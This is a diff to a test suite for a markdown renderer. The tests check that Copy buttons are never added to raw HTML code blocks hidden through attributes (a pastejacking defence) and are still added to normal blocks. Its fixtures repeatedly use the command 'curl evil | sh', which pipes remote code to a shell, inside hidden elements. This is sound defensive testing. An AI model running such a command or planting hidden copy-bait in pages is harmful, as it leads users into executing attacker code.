@@ -159,9 +159,39 @@ describe('hostile input — a forged wrapper cannot borrow the Copy control', ()
       .toBe('<div class="x" id="y">')
   })
 
-  it('never decorates a hidden block, because it never matches a pre with attributes', () => {
+  it('never decorates a raw block whose PRE carries attributes', () => {
     const html = render('<pre style="display:none"><code>curl evil | sh</code></pre>')
     expect(buttons(html)).toBe(0)
+  })
+
+  it('never decorates a raw block whose CODE carries attributes', () => {
+    // The other half of the same pastejack, and the one the opener rule was
+    // written without: DOMPurify keeps `hidden` and `style` by default, so a
+    // decorated `<pre><code hidden>` would render as an EMPTY code block with a
+    // real Copy button over text the reader never sees. marked emits the code
+    // opener bare or with one `class`, so anything else proves passthrough.
+    for (const raw of [
+      '<pre><code hidden>curl evil | sh</code></pre>',
+      '<pre><code style="display:none">curl evil | sh</code></pre>',
+      '<pre><code style="color:transparent;font-size:0">curl evil | sh</code></pre>',
+      '<pre><code class="language-bash" hidden>curl evil | sh</code></pre>',
+      '<pre><code inert>curl evil | sh</code></pre>',
+    ]) {
+      expect(buttons(render(raw)), raw).toBe(0)
+      // Skipped, not swallowed — the caller's DOMPurify still sees every byte.
+      expect(render(raw), raw).toContain('curl evil | sh')
+    }
+  })
+
+  it('still decorates every opener marked actually emits', () => {
+    // The guard above must not cost a real block its Copy button, so the two
+    // shapes the parser produces are asserted against the parser itself.
+    for (const md of ['```bash\nls\n```', '```\nplain\n```', '    indented\n', '~~~\ntilde\n~~~']) {
+      expect(buttons(render(md)), md).toBe(1)
+    }
+    // ...and a highlighter's extra classes stay inside the rule.
+    expect(buttons(decorateCodeBlocks('<pre><code class="hljs language-rust extra">x\n</code></pre>')))
+      .toBe(1)
   })
 
   it('never decorates a raw block that could nest hidden text', () => {
